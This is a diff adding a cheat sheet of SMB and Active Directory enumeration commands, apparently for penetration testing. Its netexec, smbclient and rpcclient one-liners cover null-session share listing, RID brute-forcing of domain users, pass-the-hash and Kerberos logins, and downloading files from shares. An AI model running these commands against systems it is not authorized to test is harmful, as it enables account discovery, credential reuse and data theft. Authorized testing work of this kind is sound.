@@ -1,0 +1,79 @@
+% smb, ad, enum
+
+; --- enum: banner / shares / policy / RID brute ---
+# Banner + signing + null/guest check (start here)
+nxc smb <ip>
+
+# List shares, null session
+nxc smb <ip> -u '' -p '' --shares
+
+# List shares, guest
+nxc smb <ip> -u guest -p '' --shares
+
+# List shares, authenticated
+nxc smb <ip> -u <user> -p <pass> -d <domain> --shares
+
+# Password policy (lockout / min-len / complexity)
+nxc smb <ip> -u '' -p '' --pass-pol
+
+# RID brute, enumerate domain users via SAMR (null/guest)
+nxc smb <ip> -u '' -p '' --rid-brute 10000
+
+# Logged-on users (needs creds, often admin)
+nxc smb <ip> -u <user> -p <pass> --loggedon-users
+
+# Local groups (needs creds)
+nxc smb <ip> -u <user> -p <pass> --groups
+
+# Active sessions (needs creds)
+nxc smb <ip> -u <user> -p <pass> --sessions
+
+# Recursive share spider, null session
+nxc smb <ip> -u '' -p '' -M spider_plus -o OUTPUT_FOLDER=spider_null
+
+# Recursive share spider, authenticated
+nxc smb <ip> -u <user> -p <pass> -M spider_plus -o OUTPUT_FOLDER=spider_creds
+
+# smbclient anonymous share list
+smbclient -L //<ip>/ -N
+
+# rpcclient null bind (interactive: enumdomusers, querydominfo, lsaquery)
+rpcclient -U '' -N <ip>
+
+# enum4linux-ng full enum (slow)
+enum4linux-ng -A -oJ enum4linux <ip>
+
+; --- connect / auth variants ---
+# Shares via pass-the-hash
+nxc smb <ip> -u <user> -H <nthash> -d <domain> --shares
+
+# Shares via local (non-domain) account
+nxc smb <ip> -u <user> -p <pass> --local-auth --shares
+
+# Shares via kerberos ccache (export KRB5CCNAME first)
+nxc smb <ip> --use-kcache --shares
+
+# Interactive share shell, guest
+smbclient //<ip>/<share> -U 'guest%'
+
+# Interactive share shell, null
+smbclient //<ip>/<share> -N
+
+# Interactive share shell, creds
+smbclient //<ip>/<share> -U '<domain>/<user>%<pass>'
+
+; --- download files ---
+# nxc get-file, guest
+nxc smb <ip> -u guest -p '' --share <share> --get-file <remote> <outfile>
+
+# nxc get-file, authenticated
+nxc smb <ip> -u <user> -p <pass> -d <domain> --share <share> --get-file <remote> <outfile>
+
+# nxc get-file, pass-the-hash
+nxc smb <ip> -u <user> -H <nthash> -d <domain> --share <share> --get-file <remote> <outfile>
+
+# smbget recursive dir pull
+smbget -R smb://<ip>/<share>/<remote> -U '<domain>/<user>%<pass>' -O .
+
+# smbclient one-shot get
+smbclient //<ip>/<share> -U '<domain>/<user>%<pass>' -c 'get <remote> <outfile>'
